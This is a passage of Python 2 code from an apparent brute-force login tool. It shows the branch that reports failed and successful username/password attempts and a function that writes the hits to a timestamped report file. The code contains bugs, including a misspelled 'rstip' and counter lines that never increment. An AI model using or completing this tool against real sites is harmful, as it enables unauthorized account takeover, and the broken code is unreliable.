							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
		i + 1	
	rep(report,l)

def rep(list1,list2):
	for value in list1:
		if list1.index(value) == 0:
			t = time.strftime('%d-%m-%Y')
			h = time.strftime('%H:%M:%S')
			fo = open(('BruteForceReport_' + t + '_'+ h + '.txt'), 'wb')
			fo.write('Results from the site\n')
			for element in list2:
				fo.write(element + '\n')
			fo.close()
		else:
			pass
